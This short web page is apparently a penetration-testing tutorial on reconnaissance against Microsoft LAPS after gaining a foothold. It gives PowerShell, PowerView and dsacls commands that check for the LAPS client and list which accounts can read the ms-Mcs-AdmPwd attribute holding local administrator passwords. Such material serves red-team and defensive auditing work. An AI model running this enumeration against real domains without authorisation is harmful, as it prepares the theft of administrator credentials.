<title>LAPS Recon</title>
</head><body>Firstly, we will identify whether LAPS solution has been installed on the machine which we had gained a foothold. We will leverage powershell cmdlet to identify if the admpwd.dll exist or not.<br/>
<br/>
Get-ChildItem ‘c:\program files\LAPS\CSE\Admpwd.dll’<br/>
<br/>
The very next step would be identifying who has read access to ms-Mcs-AdmPwd. we can use Powerview for identifying users having read access to ms-Mcs-AdmPwd<br/>
<br/>
Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object {<br/>
&nbsp;($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') <br/>
}<br/>
<br/>
If RSAT(Remote Server Administration Tools) is enabled on the victim machine, then there is an interesting way of identifying user’s having access to ms-Mcs-AdmPwd. we can simply fire the command:<br/>
<br/>
dsacls.exe 'Path to the AD DS Object'<br/>
<br/>
for example: dsacls.exe "OU=Managed Computers - LAPS,DC=AJLAB,DC=com"<br/>
